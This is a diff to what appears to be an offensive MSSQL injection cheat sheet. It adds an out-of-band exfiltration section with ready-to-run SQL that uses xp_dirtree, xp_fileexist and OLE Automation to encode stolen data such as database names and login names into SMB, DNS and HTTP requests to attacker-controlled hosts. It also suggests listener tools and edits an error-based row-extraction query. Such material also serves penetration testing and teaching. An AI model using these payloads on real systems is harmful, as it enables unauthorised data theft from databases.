@@ -140,8 +140,9 @@ SELECT CONVERT(INT, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY T
 
 ### Enumerate rows (data extraction)
 ```sql
-SELECT CONVERT(INT, (SELECT City FROM ORGDB.dbo.Employees ORDER BY City OFFSET 1 ROWS FETCH NEXT 1 ROW ONLY));
+SELECT CONVERT(INT, (SELECT City FROM ORGDB.dbo.Employees ORDER BY City OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY));
 ```
+Try to change 0 to 100 because that is indexing and here you can see one record at a time.
 
 ### Command execution via xp_cmdshell (requires sysadmin privileges)
 `xp_cmdshell` is disabled by default and must be explicitly enabled by a privileged account:
@@ -234,6 +235,53 @@ When there's no direct output channel, force the server to reach out to an SMB s
 EXEC master.dbo.xp_dirtree '\\attacker-ip\share';
 EXEC master.dbo.xp_fileexist '\\attacker-ip\share\x';
 ```
+
+### Out-of-band (OOB) exfiltration
+Used when there's no visible output channel at all (errors suppressed, no union output, timing too unreliable/noisy). The idea: force the SQL Server process to make an *outbound* network request (SMB or DNS) to a listener you control, encoding stolen data inside the request itself.
+ 
+**Listener setup:** run a DNS server you control (e.g. `dnschef`, `Responder`, or a Burp Collaborator/interactsh instance) or an SMB capture tool (`Responder`, `impacket-smbserver`, or Metasploit's `auxiliary/server/capture/smb`) to log incoming requests.
+ 
+#### SMB-based (UNC path) exfiltration
+The classic technique — `xp_dirtree`/`xp_fileexist` force an SMB lookup, and the requesting hostname/share can carry data:
+```sql
+EXEC master.dbo.xp_dirtree '\\attacker-ip\share';
+EXEC master.dbo.xp_fileexist '\\attacker-ip\share\x';
+```
+ 
+Encode extracted data directly into the UNC path so it shows up in your listener's logs:
+```sql
+DECLARE @data VARCHAR(1024);
+SELECT @data = (SELECT TOP 1 name FROM sys.databases);
+EXEC('master..xp_dirtree "\\' + @data + '.attacker-ip\share"');
+```
+ 
+#### DNS-based exfiltration
+Same principle, but resolved via `xp_dirtree`/`xp_fileexist`/`xp_subdirs` pointed at a domain you control instead of a raw IP — works even when SMB (port 445) is blocked outbound but DNS isn't:
+```sql
+DECLARE @data VARCHAR(1024);
+SELECT @data = (SELECT SUSER_NAME());
+EXEC('master..xp_dirtree "\\' + @data + '.attacker-domain.com\share"');
+```
+This causes the server to attempt DNS resolution of `<stolen-data>.attacker-domain.com`, which shows up as a query on your authoritative DNS server/listener — no SMB traffic required.
+ 
+#### HTTP-based exfiltration (via OLE Automation, requires sysadmin)
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+ 
+DECLARE @obj INT, @data VARCHAR(1024);
+SELECT @data = (SELECT SUSER_NAME());
+EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;
+EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker-ip/?d=' + @data, 'false';
+EXEC sp_OAMethod @obj, 'send';
+```
+
+
+#### Why use OOB over error/time-based
+- Bypasses response suppression entirely — no need for any visible output
+- Faster and more reliable than time-based blind for large data extraction
+- DNS variant works even in networks with strict outbound rules (SMB/HTTP blocked but DNS allowed for resolution)
+
 
 ### OPENROWSET (if enabled)
 Can be used to read files or make outbound connections — worth exploring in a lab environment:
